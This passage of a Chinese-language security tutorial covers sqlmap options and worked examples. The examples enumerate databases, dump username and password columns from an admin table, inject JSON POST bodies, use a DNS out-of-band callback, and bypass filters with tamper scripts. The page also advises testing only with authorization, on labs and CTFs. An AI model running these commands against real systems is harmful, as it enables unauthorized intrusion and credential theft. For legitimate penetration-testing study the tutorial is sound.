+<h2 id="七代理--指纹--调试参数">七、代理 / 指纹 / 调试参数</h2>
+<ul>
+<li>代理（抓包或走折返）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --proxy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>
+</span></span></code></pre></div><ul>
+<li>详细等级（verbosity）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-v <span style="color:#ae81ff">3</span>   <span style="color:#75715e"># 0-6，数值越大信息越详细</span>
+</span></span></code></pre></div><ul>
+<li>随机 UA 或自定义 UA</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--random-agent
+</span></span><span style="display:flex;"><span>--user-agent<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64)...&#34;</span>
+</span></span></code></pre></div><ul>
+<li>调整延时、超时与线程</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--time-sec<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>     <span style="color:#75715e"># 延时时间（用于 time-based）</span>
+</span></span><span style="display:flex;"><span>--timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>     <span style="color:#75715e"># 请求超时</span>
+</span></span><span style="display:flex;"><span>--threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>      <span style="color:#75715e"># 并发线程数（提高速度，注意不要过载目标）</span>
+</span></span></code></pre></div><ul>
+<li>测试等级与风险（更多扫描）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--level<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>    <span style="color:#75715e"># 1-5，数字越高 sqlmap 尝试的 payload 与测试点越多</span>
+</span></span><span style="display:flex;"><span>--risk<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>     <span style="color:#75715e"># 0-3，risk 越高会尝试更具破坏性/风险的 payload（如写操作）</span>
+</span></span></code></pre></div><hr>
+<h2 id="八技术类型--technique---t">八、技术类型（&ndash;technique / -T）</h2>
+<p>指定注入类型优先顺序（加快定位）：</p>
+<ul>
+<li>B = Boolean-based blind</li>
+<li>E = Error-based</li>
+<li>U = UNION query</li>
+<li>S = Stacked queries</li>
+<li>T = Time-based blind</li>
+</ul>
+<p>示例：只测试布尔与报错型</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --technique<span style="color:#f92672">=</span>BE
+</span></span></code></pre></div><hr>
+<h2 id="九避免噪音与自动化选项">九、避免噪音与自动化选项</h2>
+<ul>
+<li>批处理模式（不交互）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--batch
+</span></span></code></pre></div><ul>
+<li>跳过系统数据库</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--exclude-sysdbs
+</span></span></code></pre></div><ul>
+<li>跳过特定库/表</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>--skip<span style="color:#f92672">=</span>db1,db2
+</span></span></code></pre></div><hr>
+<h2 id="十常见实战示例">十、常见实战示例</h2>
+<ul>
+<li>基本枚举并导出 admin 表：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -p id --dbs
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -p id -D mydb --tables
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -p id -D mydb -T admin --columns
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -p id -D mydb -T admin -C <span style="color:#e6db74">&#34;username,password&#34;</span> --dump
+</span></span></code></pre></div><ul>
+<li>JSON POST 注入（指定 header）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/api&#34;</span> --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{&#34;q&#34;:&#34;test&#34;}&#39;</span> -p q --headers<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+</span></span></code></pre></div><ul>
+<li>用抓包文件（包含 multipart 上传）测试</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r req.txt --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><ul>
+<li>使用 DNSLOG 做带外回显</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --dns-domain<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yourid.ceye.io&#34;</span> --batch
+</span></span></code></pre></div><ul>
+<li>加强检测、并配合 tamper 绕过（示例）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id=1&#34;</span> -p id --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --tamper<span style="color:#f92672">=</span>between,randomcase --batch
+</span></span></code></pre></div><hr>
+<h2 id="十一安全与合规提示">十一、安全与合规提示</h2>
+<ul>
+<li>仅在授权范围内测试（公司内网、CTF、靶场、你有书面授权的目标）；</li>
+<li><code>--file-write</code>、<code>--os-shell</code>、<code>--os-cmd</code> 将产生高破坏风险，谨慎使用；</li>
+<li>导出与写文件可能触发入侵检测（IDS/IPS）或破坏系统稳定性，提前告知被授权方并获取允许；</li>
+<li>对渗透结果做好记录，避免在未授权环境造成数据泄露或法律问题。</li>
+</ul>
+<hr>
+<h2 id="十二延伸学习">十二、延伸学习</h2>
+<ul>
+<li>阅读 sqlmap 官方文档与 tamper 脚本源码来理解 payload 如何被修改；</li>
+<li>在靶场（DVWA、Mutillidae、vulnweb、OWASP Juice Shop）练习不同参数组合与 tamper；</li>
+<li>学会在 Burp 中修改与重放请求，再将抓包保存为 req.txt 用 <code>-r</code> 调用 sqlmap。</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up5/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>CTF：文件上传（ctf.show）题目整理 - 上传 Payload构造</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/cve%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/cve-2025-8088-winrar/"><span>WinRAR 目录穿越漏洞（CVE-2025-8088）复现与防护</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
